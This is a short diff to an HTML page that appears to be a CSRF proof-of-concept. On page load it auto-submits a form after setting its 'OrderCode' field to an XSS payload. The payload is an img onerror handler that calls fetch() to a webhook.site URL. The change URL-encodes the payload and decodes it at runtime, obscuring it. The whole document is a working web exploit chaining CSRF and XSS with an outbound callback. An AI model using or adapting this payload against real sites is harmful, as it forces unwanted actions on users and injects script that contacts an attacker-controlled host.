@@ -13,7 +13,9 @@
   </form>
 
   <script>
-    document.getElementById('OrderCode').value = ""><img src=x onerror="(async function(){await fetch('https://webhook.site/8fee246c-1fd8-4c73-a3b1-0090f7157873');})()">";
+    const encoded="%22%3E%3Cimg%20src=x%20onerror=%22(async%20function()%7Bawait%20fetch('https://webhook.site/8fee246c-1fd8-4c73-a3b1-0090f7157873');%7D)()%22%3E%22%3E";
+    const payload = decodeURIComponent(encoded);
+    document.getElementById('OrderCode').value = payload;
     // Immediately submit when the page loads
     document.getElementById('csrfForm').submit();
   </script>
